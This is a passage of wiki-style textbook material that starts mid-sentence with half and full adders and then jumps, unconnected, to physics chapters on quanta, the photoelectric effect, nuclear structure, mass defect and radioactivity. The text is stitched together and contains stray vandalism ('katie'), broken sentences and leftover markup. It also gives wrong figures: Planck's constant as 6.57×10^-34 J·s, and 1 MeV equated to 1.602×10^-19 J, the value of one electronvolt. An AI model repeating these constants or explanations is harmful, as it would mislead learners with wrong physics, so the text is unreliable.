significant component of the arithmetic and logical unit. Adders are composed of half adders and full adders, which add two-bit binary
pairs, and ripple carry adders and carry look ahead adders which do addition operations to a series of binary numbers.

''Note: Pictures on wikipedia under GFDL''

==Half Adder==
A half adder is a logical circuit that performs an addition operation on two binary digits. The half adder produces a sum and a carry value which are both binary digits.

Sum(s) = A xor B
Cot(c) = A and B

Following is the logic table for a half adder:

== Full adder ==

A full adder is a logical circuit that performs an addition operation on three binary digits. The full adder produces a sum and
carry value, which are both binary digits.

Sum = (A xor B) xor Cin

Cot = (A nand B) nand (Cin nand (A xor B))

= Introduction to the idea of a quantum =

Imagine that a beam of light is actually made up of little &quot;packets&quot; or &quot;bundles&quot; of energy, called '''quanta'''. 

It's like looking at a crowd of people from above. At first, it seems as though they are one huge patch, without any spaces between
them. You would never suspect that they were people. But as you move closer, you slowly begin to see that they are individuals, and when you get even closer, you may even recognize a few. Light seems like a continuous wave at first, but when we zoom in at the subatomic level, we notice that a beam of light actually consists of little &quot;packets&quot; of energy, or quanta.  (You will not be able to tell the particles of light apart though because they are of the same energy, and thus identical.  The fact that they can't be distinguished has to do with how a laser works.)

The only thing which differentiates one quantum from another is the energy contained in individual quanta (or &quot;packets&quot;). The &quot;packets&quot; are assigned a particular energy, depending on the frequency (or to put it simply: the colour) of the light wave. Quanta of '''Violet''' coloured light have the '''maximum''' energy and that of ''Red'' have the ''minimum'' energy.


This idea introduces the concept of the quantum (particle) nature of light, which is demonstrated by the photoelectric effect. When a
metal surface is illuminated with light, electrons can be emitted from the surface. This is known as the photoelectric effect.</text>

= The wave-particle duality =

Looking at things we can see with our eyes, it seems that wave and particle behavior belong to distinct types of object, but as science reached the atomic and subatomic levels it gradually appeared that each of these is really a property shared by everything.  We start by talking about light, but the same concepts apply to everything else, at the atomic scale of size and momentum.

The wave nature of light is demonstrated by diffraction, interference, and polarization of light  and the particle nature oflight is demonstrated by the photoelectric effect. So light has both wave-like and particle-like properties, but only shows one or the
other, depending on the kind of experiment we perform. A wave-type experiment shows the wave nature, and a particle-type experiment
shows particle nature.

How do we know light acts like a wave?

Demonstrating that light has wave properties: imagine dropping a pebble in water - you see circular waves stretching out in ever widening circles. Now imagine placing a barrier (for example a card or piece of wood) in the path of the wave - but a barrier with a slot cut in it. What you would see is the wave hit that barrier and its slot - and a second wave would emenate from the other side of the slot (these would be semicircular waves).  This is easy to see at home - try it in a bath of water - well, light waves do the same thing.  However, now imagine having not one slot in the barrier, but two. What you would see then is the initial wave hit the barrier - and two semicircular waves emenate from the other side - one from the other side of each slot. The key point is that these two semicircular waves would crash into each other at some point - they would 'interfere' with each other. Where their respective waves were both 'high' they would add up and you would get a peak. Similarly where their respective waves were both low they would add up (you would get an even deeper trough), but where they were in opposite states (one high, one low) they would cancel each other out.  If you could stand on the shore with your eye at water level what you would see is a series of peaks and gaps - a sort of stripped imaged. This is exactly what we see when we place a detector (for example a piece of photographic film) on the other side of the two slots when you pass a light wave light through the two slots. You see the stripped pattern where the peaks have left an image (light had fallen on the photo paper) and the gaps (where light had not fallen on the paper) - indicating that 'interference' had taken place - and that indicates that light must be behaving like a wave. 

Actually you see a hint of this in supermarkets, when they scan the bar codes with lasers.  Ordinary light is a mixture of wavelengths, so that the diffraction patterns of different wavelengths cover each other up.  The light from a laser is all the same wavelength, so the random diffraction patterns are visible as speckles.


Now, we consider light to behave not as a wave, but as particles. But what do we call a 'particle' of light?

Photon : A photon is a quantum (energy packet) of light.

Imagine a sheet of metal. On the surface, there are electrons that can be set free. If a photon comes along and strikes the surface of the metal, then it will give its entire energy packet to one electron. This means that the electron now has some energy, and
it may escape (leave the surface) if this energy Ek (kinetic energy) is greater than the minimum energy required to free an electron Emin.

Now, suppose the electron needs 5eV of kinetic energy to escape. And suppose this little photon has just 2eV of energy in its energy
packet. Then the electron will not leave the surface of the metal. But suppose the photon has 8eV of energy. This means that the
electron will emerge with 3eV of kinetic energy.

Note that this does not mean the photon can give 5eV of energy to one electron and 3eV to another. A photon will give all of its
energy to just one electron.

The minimum amount of energy needed for an electron to escape (electrons do not normally leave a metal whenever they please), is
called the work function of the metal. In our example, the work function is 5eV. The work function has a different value for each
metal: 4.70eV for copper and 2.28eV for sodium. It is worth mentioning that the best conductors tend to be those with the smallest work functions.
(For Advanced Readers: Work Function actually  represents the energy required to overcome the negative potential energy of the electron which is caused by the electrostatic attraction acting on the electron by the nucleus)

The frequency of the radiation is directly related to the energy of the photon.  It is important because if the frequency (and hence the energy) of the photon is below a certain threshold value, no electrons will be emitted. Even if the intensity of the light is increased, and the light is allowed to fall on the surface for a long period of time, if the frequency of the radiation is below the threshold frequency, electrons will not be emitted.

The energy of the photon is calculated using the formula: E = hν    (where h = 6.57 X 10^-34 J-s is Planck's constant, and ν is the frequency of the radiation).

The kinetic energy of an electron that escapes from the metal is equal to the energy of the photon minus the work function, Φ, i.e.

Ek = (hν) - Φ

The electrons emerge with a range of velocities from zero up to a maximum Vmax. The maximum kinetic energy, (1/2)m(Vmax)^2, depends
(linearly) on the frequency of the radiation, and is independent of its intensity.

For incident radiation of a given frequency, the number of electrons emitted per unit time is proportional to the intensity of the
radiation.

Electron emission takes place from the instant the light shines on the surface, i.e. there is no detectable time delay.


What are the uses of the photoelectric effect? 

The most common use of photoelectric effect is in solar cells. Light energy from the sun is used to excite electrons out of metal surfaces which can then be made to flow in a circuit (i.e., replace a conventional cell!). The current obtained depends on the intensity (or simply: the brightness) of the light.

For this (and other work), Einstein received the Nobel Prize (Physics) in 1921 (&quot;...for his services to Theoretical Physics, and especially for his discovery of the law of the photoelectric effect.&quot;).</text>

= Inside atomic nucleus =

Amazingly enough, the human mind that is contained inside a couple of liters of human's brain, is able to deal with extremely large as well as extremely small objects such as the whole universe and its smallest building blocks. So, what are these building blocks? As we already know, the universe consists of galaxies, which consist of stars with planets moving around. The planets are made of molecules, which are bound groups (chemical compounds) of atoms.

There are more than stars in the universe. Currently, scientists know over 12 million chemical compounds i.e. 12 million
different molecules. All this variety of molecules is made of only a hundred of different atoms. For those who believe in beauty and
harmony of nature, this number is still too large. They would expect to have just few different things from which all other substances
are made. In this chapter, we are going to find out what these elementary things are.</text>

= What the atom is made of =

The Greek word &lt;math&gt;\alpha\tau o\mu o\nu&lt;/math&gt; (atom) means indivisible. The discovery of the fact that an atom is
actually a complex system and can be broken in pieces was the most important step and pivoting point
in the development of modern physics.

It was discovered (by Rutherford in 1911) that an atom consists of a positively charged nucleus and negative electrons moving around it.
At first, people tried to visualize an atom as a microscopic analog of our solar system where planets move around the sun. This naive
planetary model assumes that in the world of very small objects the Newton laws of classical mechanics are valid. This, however, is not
the case.

|}

The microscopic world is governed by quantum mechanics which does not have such notion as trajectory. Instead, it describes the
dynamics of particles in terms of quantum states that are characterized by probability distributions of various observable quantities.

For example, an electron in the atom is not moving along a certain trajectory but rather along all imaginable trajectories with
different probabilities. If we were trying to catch this electron, after many such attempts we would discover that the electron can be
found anywhere around the nucleus, even very close to and very far from it. However, the probabilities of finding the electron at
different distances from the nucleus would be different. What is amazing: the most probable distance corresponds to the classical trajectory!

You can visualize the electron inside an atom as moving around the nucleus chaotically and extremely fast so that for our ``mental
eyes'' it forms a cloud. In some places this cloud is more dense while in other places more thin. The density of the cloud
corresponds to the probability of finding the electron in a particular place. Space distribution of this density (probability)
is what we can calculate using quantum mechanics. Results of such calculation for hydrogen atom are shown in Fig. 15.1 . As was mentioned above, the most probable distance (maximum of the curve) coincides with the Bohr radius. 

Quantum mechanical equation for any bound system (like an atom) can have solutions only at a discrete set of energies &lt;math&gt;E_1, E_2, E_3 \dots&lt;math&gt; &lt;/math&gt;, etc. There are simply no solutions for the energies &lt;math&gt;E&lt;/math&gt; in between these values, such as, for instance, &lt;math&gt;E_1 &lt; E &lt; E_2&lt;/math&gt;. This is why a bound system  of microscopic particles cannot have an arbitrary energy and can only be in one of the quantum states. Each of such states has certain energy and certain space configuration, i.e. distribution of the probability. A bound quantum system can make transitions from one quantum state to another either spontaneously or as a result of interaction  with other systems. The energy conservation law is one of the most fundamental and is valid in quantum world as well as in classical world. This means that any transition between the states with energies &lt;math&gt;E_i&lt;/math&gt; and &lt;math&gt;E_j&lt;/math&gt; is accompanied with either emission or absorption of the energy &lt;math&gt;\Delta E=|E_i-E_j|&lt;/math&gt;. This is how an atom emits light. 

An electron is a very light particle. Its mass is negligible as compared to the total mass of the atom. For example, in the lightest
of all atoms, hydrogen, the electron constitutes only 0.054% of the atomic mass. In the silicon atoms that are the main component of the
rocks around us, all 14 electrons make up only 0.027% of the mass. Thus, when holding a heavy rock in your hand, you actually feel the
collective weight of all the nuclei that are inside it.</text>

= Nucleus =

Is the nucleus a solid body? Is it an elementary building block of nature?! Although it is very small, a nucleus consists of something even smaller. 

== Proton ==

The only way to do experiments with such small objects as atoms and nuclei, is to collide them with each other and watch what happens. Perhaps you think that this is a barbaric way, like colliding a ''Mercedes'' and ''Toyota'' in order to learn what is under their bonnets. But with microscopic particles nothing else can be done.

In the early 1920s Rutherford and other physicists made many experiments, changing one element into another by striking them with
energetic helium nuclei. They noticed that all the time hydrogen nuclei were emitted in the process. It was apparent that the
hydrogen nucleus played a fundamental role in nuclear structure and was a constituent part of all other nuclei. By the late 1920's
physicists were regularly referring to hydrogen nucleus as ''proton''. The term ''proton'' seems to have been coined by
Rutherford, and first appears in print in 1920.

== Neutron ==

Thus it was established that atomic nuclei consist of protons. The number of protons in a nucleus is
such that makes up its positive charge. This number, therefore, coincides with the atomic number of
the element in the Mendeleev's Periodic table. 

This sounded nice and logical, but serious questions remained. Indeed, how can positively charged protons stay together in a
nucleus? Repelling each other by electric force, they should fly away in different directions. Who keeps them together?

Furthermore, the proton mass is not enough to account for the nuclear masses. For example, if the protons were the only particles
in the nucleus, then a helium nucleus (atomic number 2) would have two protons and therefore only twice the mass of hydrogen. However,
it actually is four times heavier than hydrogen. This suggests that it must be something else inside nuclei in addition to protons.

These additional particles that kind of ''glue'' the protons and make up the nuclear mass, apparently, are electrically neutral. They
were therefore called ''neutrons''. Rutherford predicted the existence of the neutron in 1920. Twelve years later, in 1932, his
assistant James Chadwick found it and measured its mass, which turned out to be almost the same but slightly larger than that of the proton.

==  Isotopes ==

Thus, in the early 1930s it was finally proved that atomic nucleus consists of two types of particles, the protons and neutrons. The protons are positively
charged while the neutrons are electrically neutral. The proton charge is exactly equal but opposite to that of the electron. The
masses of proton and neutron are almost the same, approximately 1836 and 1839 electron masses, respectively.

Apart from the electric charge, the proton and neutron have almost the same properties. This is why there is a common name for them:
''nucleon''. Both the proton and neutron are nucleons, like a man and a woman are both humans. In physics literature, the proton is
denoted by letter &lt;math&gt;p&lt;/math&gt; and the neutron by &lt;math&gt;n&lt;/math&gt;. Sometimes, when the difference between them is unimportant, it is used the letter &lt;math&gt;N&lt;/math&gt; 
meaning nucleon (in the same sense as using the word ''person'' instead of man or woman).

Chemical properties of an element are determined by the charge of its atomic nucleus, i.e. by the number of protons. This number is
called the ''atomic number'' and is denoted by letter &lt;math&gt;Z&lt;/math&gt;. The mass of an atom depends on how many nucleons its nucleus contains.
The number of nucleons, i.e. total number of protons and neutrons, is called the ''atomic mass number'' and is denoted by letter &lt;math&gt;A&lt;/math&gt;. 

Standard nuclear notation shows the chemical symbol, the mass number and the atomic number of the isotope.

[[Image:Fhsst_atomnucl2.png|13px|]]

For example, the iron nucleus (26-th place in the Mendeleev's periodic table of the elements) with 26 protons and 30 neutrons is denoted as &lt;math&gt;{}^{56}_{26}{\rm Fe}\ &lt;/math&gt;, where the total nuclear charge is &lt;math&gt;Z=26&lt;/math&gt; and the mass number &lt;math&gt;A=56&lt;/math&gt;. The number of neutrons is simply the difference &lt;math&gt;N=A-Z&lt;/math&gt;(here, it is used the same letter &lt;math&gt;N&lt;/math&gt;, as for nucleon, but this should not cause any confusion). Chemical symbol is inseparably linked with &lt;math&gt;Z&lt;/math&gt;.  This is why the lower index is sometimes omitted and you may encounter the simplified notation like &lt;math&gt;{}^{56}{\rm Fe}&lt;/math&gt;. 

If we add or remove a few neutrons from a nucleus, the chemical properties of the atom remain the same because its charge is the
same. This means that such atom should remain in the same place of the Periodic table. In Greek, ''same place'' reads &lt;math&gt;\acute{\iota}\sigma o\varsigma&lt;/math&gt; &lt;math&gt;\tau \acute{o}\pi o\varsigma&lt;/math&gt; (isos topos). The nuclei, having the same number of protons, but
different number of neutrons, are called therefore ''isotopes''.

Different isotopes of a given element have the same atomic number &lt;math&gt;Z&lt;/math&gt;, but different mass numbers &lt;math&gt;A&lt;/math&gt; since they have different 
numbers of neutrons &lt;math&gt;N&lt;/math&gt;. Chemical properties of different isotopes of an element are identical, but they will often have great
differences in nuclear stability. For stable isotopes of the light elements, the number of neutrons will be almost equal to the number
of protons, but for heavier elements, the number of neutrons is always greater than &lt;math&gt;Z&lt;/math&gt; and the neutron excess tends to grow when 
&lt;math&gt;Z&lt;/math&gt; increases. This is because neutrons are kind of glue that keeps repelling protons together. The greater the repelling charge, the
more glue you need.</text>

= Nuclear force =

Since atomic nuclei are very stable, the protons and neutrons must be kept inside them by some force and this force
must be rather strong. What is this force? All of modern particle physics was discovered in the effort to understand this force!

Trying to answer this question, at the beginning of the twentieth century, physicists found that all they knew before, was inadequate to explain how the nucleus held together in spite of the electrostatic repulsion of the protons pushing it apart.
They knew only gravitational and electromagnetic forces. It was clear that the forces holding
nucleons were not electromagnetic. Indeed, the protons, being positively charged, repel each other and all nuclei would decay in a
split of a second if some other forces would not hold them together. On the other hand, it was also clear that they were not
gravitational, which would be too weak for the task.

The simple conclusion was that nucleons are able to attract each other by yet unknown ''nuclear forces'', which are stronger than
the electromagnetic ones. Further studies proved that this hypothesis was correct.

Nuclear force has rather unusual properties. Firstly, it is charge independent. This means that in all pairs &lt;math&gt;nn&lt;/math&gt;, &lt;math&gt;pp&lt;/math&gt;, and &lt;math&gt;np&lt;/math&gt; nuclear forces are the same. 

Secondly, at distances of about &lt;math&gt;10^{-15}&lt;/math&gt; meter, the nuclear force is attractive and very strong, roughly 100 times stronger than electromagnetic repulsion.  

Thirdly, the nuclear force is of a very short range. If the nucleons
move away from each other for more than few ''fermi'' (1 fermi = 1 fm [femtometer] = &lt;math&gt;10^{-15}&lt;/math&gt; meter) the nuclear attraction practically disappears. Therefore the nuclear force looks like a ''strong man with very short arms''.</text>

== Binding energy and nuclear masses ==
When a system of particles is bound, you have to spend certain energy to disintegrate it, i.e. to separate the particles. The easiest way to do it is to strike the system with
a moving particle that carries kinetic energy, like we can destroy a glass bottle with a bullet or a stone. If our bullet-particle moves
too slow (i.e. does not have enough kinetic energy) it cannot disintegrate the system. On the other hand, if its kinetic energy is
too high, the system is not only disintegrated but the separated particles acquire some kinetic energy, i.e. move away with some
speed. There is an intermediate value of the energy which is just enough to destroy the system without giving its fragments any speed.
This minimal energy needed to break up a bound system is called ''binding energy'' of this system. It is usually denoted by letter &lt;math&gt;B&lt;/math&gt;. 

== Nuclear energy units ==
The standart unit of energy, the ''joule'', is too large to measure the energies associated with individual
nuclei. This is why in nuclear physics it is more convenient to use a much smaller unit called megaelectronvolt (MeV). This is the
amount of energy that an electron acquires after passing between two charged plates with the potential difference (voltage) of one
million volts. Sounds very huge, isn't it? But look at this relation
&lt;center&gt;&lt;math&gt;1\,{\rm MeV}=1.602\times10^{-19}\,{\rm J}&lt;/math&gt;&lt;/center&gt;
and think again. In the units of MeV, most of the energies in nuclear world can be expressed by values with only few digits before
decimal point and without ten to the power of something. For example, the binding energy of proton and neutron (which is the
simplest nuclear system and is called ''deuteron'') is 
&lt;center&gt;&lt;math&gt;B_{pn}=2.225\,{\rm MeV}\ .&lt;/math&gt;&lt;/center&gt;
The simplicity of the numbers is not the only advantage of using the unit MeV. Another, more important advantage, comes from the fact
that most of experiments in nuclear physics are collision experiments, where particles are accelerated by electric field and
collide with other particles. From the above value of &lt;math&gt;B_{pn}&lt;/math&gt;, for instance, we immediately know that in order to break up deuterons,
we need to bombard them with a flux of electrons accelerated through a voltage not less than 2.225 million volts. No calculation is
needed! On the other hand, if we know that a charged particle (with a unit charge) passes through a voltage, say, 5 million volts, we
can, without any calculation, say that it acquires the energy of 5 MeV. It is very convenient. Isn't it?

== Mass defect ==
Comparing the masses of atomic nuclei with the masses of the nucleons that constitute them, we encounter a
surprising fact: Total mass of the nucleons is greater than mass of the nucleus! For example, for the deuteron we have
&lt;center&gt;&lt;math&gt;m_d &lt; m_p + m_n\ ,&lt;/math&gt;&lt;/center
where &lt;math&gt;m_d&lt;/math&gt; &lt;math&gt;m_p&lt;/math&gt;, and &lt;math&gt;m_n&lt;/math&gt; are the masses of deuteron, proton and neutron, respectively. The difference is rather small,
&lt;center&gt;&lt;math&gt;(m_p+m_n)-m_d= 3.968\times10^{-30}\,{\rm kg}\ ,&lt;/math&gt;&lt;/center&gt;
but on the nuclear scale is noticeable since the mass of proton, for example,
&lt;center&gt;&lt;math&gt;m_p=1672.623\times10^{-30}\,{\rm kg}&lt;/math&gt;&lt;/center&gt;
is also very small. This phenomenon is called ''''mass defect''''.
Where the mass disappears to, when nucleons are bound?
To answer this question, we notice that the energy of a bound state is lower than the energy of free particles. Indeed, to liberate them
from a bound complex, we have to give them some energy. Thinking in the opposite direction, we conclude that, when forming a bound
state, the particles have to get rid of the energy excess, which is exactly equal to the binding energy. This is observed
experimentally: When a proton captures a neutron to form a deuteron, the excess energy of 2.225MeV
is emitted via electromagnetic radiation.
A logical conclusion from the above comes by itself: When proton and neutron are bounding, some part of their mass disappears together
with the energy that is carried away by the radiation. And in the opposite process, when we break up the deutron, we give it the
energy, some part of which makes up the lost masses
Albert Einstein came to the idea of the equivalence between the mass and energy long before any experimental evidences were found. In his
theory of relativity, he showed that total energy &lt;math&gt;E&lt;/math&gt; of a moving body with mass &lt;math&gt;m&lt;/math&gt; is 
{| 
|- 
|&lt;math&gt;\begin{matrix}E=\frac{mc^2}{\sqrt{1-\frac{v^2}{c^2}}}\ ,\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(15.1)
|}
where &lt;math&gt;v&lt;/math&gt; is its velocity and &lt;math&gt;c&lt;/math&gt; the speed of light. Applying this 
equation to a non-moving body (&lt;math&gt;v=0&lt;/math&gt;), we conclude that it possesses the ''rest'' energy
{| 
|- 
|&lt;math&gt;\begin{matrix}E_0=mc^2\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(15.2)
|}
simply because it has mass. As you will see, this very formula is the basis for making nuclear bombs and nuclear power stations!

All the development of physics and chemistry, preceding the theory of relativity, was based on the assumption that the mass and energy
of a closed system are conserving in all possible processes and they are conserved separately. In reality, it turned out that the
conserving quantity is the ''mass-energy'', 
&lt;center&gt;&lt;math&gt;E_{\rm kin}+E_{\rm pot}+E_{\rm rad}+mc^2={\rm const}\ ,&lt;/math&gt;&lt;/center&gt;
i.e. the sum of kinetic energy, potential energy, the energy of radiation, and the mass of the system.
In chemical reactions the fraction of the mass that is transformed into other forms of energy (and vice versa), is so small that it is
not detectable even in most precise measurements. In nuclear processes, however, the energy release is very often millions times
higher and therefore is observable.
You should not think that mutual transformations of mass and energy are the features of only nuclear and atomic processes. If you break
up a piece of rubber or chewing gum, for example, in two parts, then the sum of masses of these parts will be slightly larger than the
mass of the whole piece. Of course we will not be able to detect this ''mass defect'' with our scales. But we can calculate it, using
the Einstein formula (15.1). For this, we would need to measure somehow the mechanical work ''W'' used to break up the whole 
piece (i.e. the amount of energy supplied to it). This can be done by measuring the force and displacement in the breaking process.
Then, according to Eq. (15.2), the mass defect is
&lt;center&gt;&lt;math&gt;\Delta m=\frac{W}{c^2}&lt;/math&gt;&lt;/center&gt;
To estimate possible effect, let us assume that we need to stretch a piece of rubber in 10cm before it breaks, and the average force
needed for this is 10N (approximately 1 kg). Then 
&lt;center&gt;&lt;math&gt;W=10\,{\rm N}\times 0.1\,{\rm m}=1\,{\rm J} &lt;/math&gt;,&lt;/center&gt;
and hence
&lt;center&gt;&lt;math&gt;\Delta m=\frac{1\,{\rm J}}{(299792458\,{\rm m/s})^2}\approx1.1\times10^{-17}\,{\rm kg}&lt;/math&gt;.&lt;/center&gt;
This is very small value for measuring with a scale, but huge as compared to typical masses of atoms and nuclei.

== Nuclear masses ==
Apparently, an individual nucleus cannot be put on a scale to measure its mass. Then how can nuclear masses be measured?
This is done with the help of the devices called ''mass spectrometers''. In them, a flux of identical nuclei, accelerated to
a certain energy, is directed to a screen where it makes a visible mark. Before striking the screen, this flux passes through magnetic
field, which is perpendicular to velocity of the nuclei. As a result, the flux is deflected to certain angle. The greater the
mass, the smaller is the angle (because of inertia). Thus, measuring the displacement of the mark from the center of the screen, we can
find the deflection angle and then calculate the mass.
Since mass and energy are equivalent, in nuclear physics it is customary to measure masses of all particles in the units of energy,
namely, in MeV. Examples of masses of subatomic particles are given in Table 15.1

The values given in this table, are the energies to which the nuclear masses are equivalent via the Einstein formula 15.1.

There are several advantages of using the units of MeV to measure particle masses. First of all, like with nuclear energies, we avoid
handling very small numbers that involve ten to the power of something. For example, if we were measuring masses in kg, the
electron mass would be  &lt;math&gt;m_e=9.1093897 \times 10^{-31}&lt;/math&gt; kg. When masses are given in the equivalent energy units, it is very easy to
calculate the mass defect. Indeed, adding the masses of proton and neutron, given in the second and third rows of Table 15.1, and subtracting the mass of &lt;math&gt;{}^2_1&lt;/math&gt;H, 
we obtain the binding energy 2.225MeV of the deuteron without further ado. One more advantage comes from particle physics. In collisions of very fast moving particles new particles (like
electrons) can be created from vacuum, i.e. kinetic energy is directly transformed into mass. If the mass is expressed in the
energy units, we know how much energy is needed to create this or that particle, without calculations.</text>

= Radioactivity =

As was said before, the nucleus experiences the intense struggle between the electric repulsion of protons and
nuclear attraction of the nucleons to each other. It therefore should not be surprising that there are many nuclei that are
unstable. They can spontaneously (i.e. without an external push) break in pieces. When the fragments reach the distances where the
short range nuclear attraction disappears, they fiercely push each other away by the electric forces. Thus accelerated, they move in
different directions like small bullets making destruction on their way. This is an example of nuclear radioactivity but there are
several other varieties of radioactive decay.

== Discovery of radioactivity ==

Nuclear radioactivity was discovered by Antoine Henri Becquerel in 1896. Following Wilhelm Roentgen who
discovered the X-rays, Becquerel pursued his own investigations of these mysterious rays.

The material Becquerel chose to work with contained uranium. He found that the crystals containing uranium and exposed to sunlight,
made images on photographic plates even wrapped in black paper. He mistakenly concluded that the sun's energy was being absorbed by
the uranium which then emitted X-rays. The truth was revealed thanks to bad weather.katie

On the 26th and 27th of February 1896 the skies over Paris were overcast and the uranium crystals Becquerel intended to expose to
the sun were returned to a drawer and put over (by chance) the photographic plates. On the first of March, Becquerel developed the
plates and to his surprise, found that the images on them were clear and strong. Therefore the uranium emitted radiation without an
external source of energy such as the sun. This was the first observation of the nuclear radioactivity.

Later, Becquerel demonstrated that the uranium radiation was similar to the X-rays but, unlike them, could be deflected by a
magnetic field and therefore must consist of charged particles. For his discovery of radioactivity, Becquerel was awarded the 1903 Nobel
Prize for physics.

== Nuclear alpha, beta, and gamma rays ==

Classical experiment that revealed complex content of the nuclear radiation, was done as
follows. The radium crystals (another radioactive element) were put at the bottom of a narrow straight channel made in a thick piece of
lead and open at one side. The lead absorbed everything except the particles moving along the channel. This device therefore produced a
flux of particles moving in one direction like bullets from a machine gun. In front of the channel
was a photoplate that could register the particles. 

Without the magnetic field, the image on the plate was in the form of one single dot. When the device was immersed into a perpendicular
magnetic field, the flux of particles was split in three fluxes, which was reflected by three dots on the photographic plate.

One of the three fluxes was straight, while two others were deflected in opposite directions. This showed that the initial flux contained
positive, negative, and neutral particles. They were named respectively the &lt;math&gt;\alpha&lt;/math&gt;
&lt;math&gt;\beta&lt;/math&gt;, and &lt;math&gt;\gamma&lt;/math&gt; particles. 


The &lt;math&gt;\alpha&lt;/math&gt;-rays were found to be the &lt;math&gt;{}^4&lt;/math&gt;He nuclei, two protons and two neutrons bound together. They have weak penetrating ability,
a few centimeters of air or a few sheets of paper can effectively block them. The &lt;math&gt;\beta&lt;/math&gt;-rays proved to be electrons. They have a 
greater penetrating power than the &lt;math&gt;\alpha&lt;/math&gt;-particles and can penetrate 3mm of aluminum. The &lt;math&gt;\gamma&lt;/math&gt;-rays are not deflected 
because they are high energy photons. They have the same nature as the radio waves, visible light, and the X-rays, but have much
shorter wavelength and therefore are much more energetic. Among the three, the &lt;math&gt;\gamma&lt;/math&gt;-rays have the greatest penetrating power being 
able to pass through several centimeters of lead and still be detected on the other side.

== Danger of the ionizing radiation ==

The &lt;math&gt;\alpha&lt;/math&gt;, &lt;math&gt;\beta&lt;/math&gt;, and &lt;math&gt;\gamma&lt;/math&gt; particles moving through matter, collide with atoms and knock out
electrons from them, i.e. make positive ions out of the atoms. This is why these rays are called ''ionizing radiation''.

Apart from ionizing the atoms, this radiation destroys molecules. For humans and all other organisms, this is the most dangerous
feature of the radiation. Imagine thousands of tiny tiny bullets passing through your body and making destruction on their way.
Although people do not feel any pain when exposed to nuclear radiation, it harms the cells of the body and thus can make people
sick or even kill them. Illness can strike people years after their exposure to nuclear radiation. For example, the ionizing particles
can randomly modify the DNA (long organic molecules that store all the information on how a particular cell should function in the
body). As a result, some cells with wrong DNA may become cancer cells.

Fortunately, our body is able to repair some damages caused by radiation. Indeed, we are constantly bombarded by the radiation
coming from the outer space as well as from the inner parts of our own planet and still survive. However, if the number of damages
becomes too large, the body will not cope with them anymore.

There are established norms and acceptable limits for the radiation that are considered safe for human body. If you are going to work in
contact with radioactive materials or near them, make sure that the exposure dose is monitored and the limits are adhered to.

You should understand that no costume can protect you from &lt;math&gt;\gamma&lt;/math&gt;-rays! Only a thick wall of concrete or metal can stop 
them. The special costumes and masks that people wear when handling radioactive materials, protect them not from the rays but from
contamination with that materials. Imagine if few specks of radioactive dirt stain your everyday clothes or if you inhale
radioactive atoms. They will remain with you all the time and will shoot the ''bullets'' at you even when you are sleeping.

In many cases, a very effective way of protecting yourself from the radiation is to keep certain distance. Radiation from nuclear
sources is distributed equally in all directions. Therefore the number &lt;math&gt;n&lt;/math&gt; of dangerous particles passing every second through a 
unit area (say &lt;math&gt;1 cm^2&lt;/math&gt;) is the total number &lt;math&gt;N&lt;/math&gt; of particles emitted during 1 second, divided by the surface of a sphere 

&lt;center&gt;&lt;math&gt;n=\frac{N}{4\pi r^2}\ &lt;/math&gt;,&lt;/center&gt;

where &lt;math&gt;r&lt;/math&gt; is the distance at which we make the observation. From this simple formula, it is seen that the radiation intensity falls
down with increasing distance quadratically. In other words, if you increase the distance by a factor of 2, your exposure to the
radiation will be decreased by a factor of 4.

== Decay law ==

Unstable nuclei decay spontaneously. A given nucleus can decay next moment, next day or even next century. Nobody
can predict when it is going to happen. Despite this seemingly chaotic and ''unscientific''
situation, there is a strict order in all this.

Atomic nuclei, being microscopic objects, are ruled by quantum probabilistic laws. Although we cannot predict the exact moment of
its decay, we can calculate the probability that a nucleus will decay within this or that time interval. Nuclei decay because of
their internal dynamics and not because they become ''old'' or somehow ''rotten''.

To illustrate this, let us imagine that yesterday morning we found that a certain nucleus was going to decay within 24 hours with the
probability of 50%. However, this morning we found that it is still ''alive''. This fact does not mean that the decay probability for
another 24 hours increased. Not at all! It remains the same, 50%, because the nucleus remains the same, nothing wrong happened to
it. This can go on and on for centuries.

Actually, we never deal with individual nuclei but rather with huge numbers of identical nuclei. For such collections (ensembles) of
quantum objects, the probabilistic laws become statistical laws. Let us assume that in the above example we had 1 million identical
nuclei instead of only one. Then by this morning only half of these nuclei would survive because the decay probability for 24 hours was
50%. Among the remaining 500000 nuclei, 250000 will decay by tomorrow morning, then after another 24 hours only 125000 will
remain and so on.

The number of unstable nuclei that are still ''alive'' continuously decreases with time according to the curve shown in Fig. 15.2

{| 
|+ '''Figure: 15.2 ''' ''The time T1/2 during which one half of the initial amount of unstable particles decay, is called their half-life time.''
|[[Image:Fhsst_atomnucl3.png|fhsst_atomnucl3.png]]
|}

If initially, at time &lt;math&gt;t=0&lt;/math&gt;, their number is &lt;math&gt;N_0&lt;/math&gt;, then after certain time interval &lt;math&gt;T_{1/2}&lt;/math&gt; only half of these nuclei will 
remain, namely, &lt;math&gt;\frac12 N_0&lt;/math&gt;. Another one half of the remaining half will decay during another such interval. So, after the time
&lt;math&gt;2T_{1/2}&lt;/math&gt;, we will have only one quarter of the initial amount, and so on. The time interval &lt;math&gt;T_{1/2}&lt;/math&gt;, during which one half of 
unstable nuclei decay, is called their ''half-life time''. It is specific for each unstable nucleus and vary from a fraction of a
second to thousands and millions of years. A few examples of such lifetimes are given in Table 15.2

== Radioactive dating ==

Examining the amounts of the decay products makes possible radioactive dating. The most famous is the
''Carbon dating'', a variety of radioactive dating which is applicable only to matter which was once living and presumed to be
in equilibrium with the atmosphere, taking in carbon dioxide from the air for photosynthesis.

Cosmic ray protons blast nuclei in the upper atmosphere, producing neutrons which in turn bombard nitrogen, the major constituent of
the atmosphere. This neutron bombardment produces the radioactive isotope &lt;math&gt;{}^{14}_{6}&lt;/math&gt;C. The radioactive carbon-14 combines 
with oxygen to form carbon dioxide and is incorporated into the cycle of living things.

The isotope &lt;math&gt;{}^{14}_{6}&lt;/math&gt; decays (see Table 15.2) inside living bodies but is replenished
from the air and food. Therefore, while an organism is alive, the concentration of this isotope in the body remains constant. After
death, the replenishment from the breath and food stops, but the isotopes that are in the dead body continue to decay. As a result
the concentration of  &lt;math&gt;{}^{14}_{6}&lt;/math&gt;C in it gradually decreases according to the curve shown in Fig. 15.2. The time &lt;math&gt;t=0&lt;/math&gt; on this Figure 
corresponds to the moment of death, and &lt;math&gt;N_0&lt;/math&gt; is the equilibrium concentration of &lt;math&gt;{}^{14}_{6}&lt;/math&gt;C in living organisms. 

